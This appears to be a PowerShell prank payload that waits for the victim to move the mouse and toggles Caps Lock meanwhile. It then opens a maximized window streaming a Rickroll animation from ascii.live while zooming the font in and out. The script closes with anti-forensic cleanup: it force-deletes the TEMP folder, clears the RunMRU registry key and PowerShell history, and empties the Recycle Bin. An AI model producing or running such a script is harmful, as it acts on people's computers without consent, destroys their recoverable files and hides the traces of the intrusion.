$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $i -namespace native

# Function to maximize the window
function Maximize-Window {
    param ($processHandle)
    # SW_MAXIMIZE (3) to maximize the window
    [native.win]::ShowWindow($processHandle, 3)
}

function Target-Comes {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o = New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
            break
        } else {
            $o.SendKeys("{CAPSLOCK}"); Start-Sleep -Seconds $pauseTime
        }
    }
}

# Function to start the PowerShell process with a given URL and maximize the window
function Start-PowerShellProcess {
    param ($url)
    $process = Start-Process powershell.exe -ArgumentList "-NoExit", "-Command", "curl.exe $url" -PassThru -WindowStyle Maximized
    Start-Sleep -Seconds 2
    return $process
}

# Function to simulate Ctrl + Wheel Down to increase font size
function Increase-FontSize {
    for ($i = 0; $i -lt 7; $i++) {
        [System.Windows.Forms.SendKeys]::SendWait("^{+}")
        Start-Sleep -Milliseconds 100
    }
}

# Function to simulate Ctrl + Wheel Up to decrease font size
function Decrease-FontSize {
    for ($i = 0; $i -lt 7; $i++) {
        [System.Windows.Forms.SendKeys]::SendWait("^{-}")
        Start-Sleep -Milliseconds 100
    }
}

# Function to loop and adjust the font size repeatedly
function Loop-FontSizeAdjustment {
    param ($process)
    while ($process.HasExited -eq $false) {
        Increase-FontSize
        Decrease-FontSize
    }
}

#############################################################################################################################################

# Fetch ASCII art using curl
Target-Comes

# Main execution flow
Add-Type -AssemblyName System.Windows.Forms

# Start the PowerShell process
$process = Start-PowerShellProcess "http://ascii.live/rick"

# Adjust font size in an infinite loop, stopping when the process exits
Loop-FontSizeAdjustment -process $process

# Turn off caps lock if it is left on
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
if ($caps -eq $true) {
    $key = New-Object -ComObject WScript.Shell;
    $key.SendKeys('{CapsLock}')
}

# Empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete PowerShell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
